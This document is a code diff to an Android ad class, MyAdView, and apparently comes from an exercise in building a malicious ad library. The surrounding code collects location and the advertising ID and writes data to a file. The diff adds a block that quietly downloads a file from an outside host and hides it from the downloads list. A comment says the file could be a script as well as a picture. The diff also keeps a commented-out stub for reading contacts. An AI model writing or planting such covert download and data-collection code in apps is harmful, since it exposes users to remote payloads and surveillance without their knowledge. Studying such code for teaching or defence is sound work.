@@ -23,6 +23,11 @@ import com.google.android.gms.ads.identifier.AdvertisingIdClient;
 import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
 import com.google.android.gms.common.GooglePlayServicesRepairableException;
 
+// Imports for the file downloading function
+import android.app.DownloadManager;
+import android.net.Uri;
+
+
 import java.io.IOException;
 import java.io.OutputStreamWriter;
 
@@ -45,6 +50,7 @@ public class MyAdView {
 
         Long tsLong = System.currentTimeMillis()/1000;
         String ts = tsLong.toString();
+
         // GET LOCATION
         if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             return;
@@ -119,6 +125,21 @@ public class MyAdView {
         };
         task.execute();
 
+        ////////// DOWNLOAD SCRIPT FROM A WEBSITE
+        // I this example case it is just a picture, but it could be something else
+        DownloadManager downloadmanager = (DownloadManager) ctx.getSystemService(ctx.DOWNLOAD_SERVICE);
+        Uri uri = Uri.parse("http://classe-confidentiel.com/boyd/4.png");
+
+        DownloadManager.Request request = new DownloadManager.Request(uri);
+        request.setTitle("My File");
+        request.setDescription("Downloading");
+        request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
+        request.setVisibleInDownloadsUi(false);
+        request.setDestinationUri(Uri.parse("file:///mnt/sdcard/myPicture.png"));
+
+        downloadmanager.enqueue(request);
+
+
 
         ////////// READ CONTACTS
         //Uri personUri = ContentUris.withAppendedId(People.CONTENT_URI, personId);
@@ -126,9 +147,14 @@ public class MyAdView {
         //String[] proj = new String[] {Phones._ID, Contacts.People.Phones.TYPE, Contacts.People.Phones.NUMBER, Contacts.People.Phones.LABEL};
         //Cursor cursor = contentResolver.query(phonesUri, proj, null, null, null);
 
+
+
+
+
+
         ////////////WRITE TO FILE
 
-        }
+    }
     private static void writeToFile(String data ){
         try {
             OutputStreamWriter outputStreamWriter = new OutputStreamWriter(ctx.openFileOutput("Part1 malad.txt", ctx.MODE_PRIVATE));
